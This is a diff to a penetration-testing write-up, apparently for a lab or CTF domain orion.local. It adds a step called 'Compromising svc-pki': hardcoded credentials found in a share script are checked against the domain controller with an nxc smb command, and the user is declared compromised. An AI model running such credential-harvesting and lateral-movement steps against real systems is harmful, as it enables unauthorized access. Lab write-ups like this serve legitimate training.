@@ -522,6 +522,8 @@ evil-winrm-py PS C:\Shares\IT>
 
 This user has access to the IT share, this is likely the admin group bloodhound showed allowing us access
 
+# Compromising `svc-pki`
+
 ```python
 evil-winrm-py PS C:\Shares\IT\Scripts> type Publish-CRL.ps1
 <#
@@ -586,4 +588,14 @@ The IT directory has a script that has hardcoded creds inside
 ```python
 svc-pki:Pki@Orion2026!
 ```
+
+```python
+❯❯❯ nxc smb dc01.orion.local -u svc-pki -p 'Pki@Orion2026!'
+SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.5        445    DC01             [+] orion.local\svc-pki:Pki@Orion2026!
+```
+
+This user is now compromised
+
+There is also some other files in this share
 
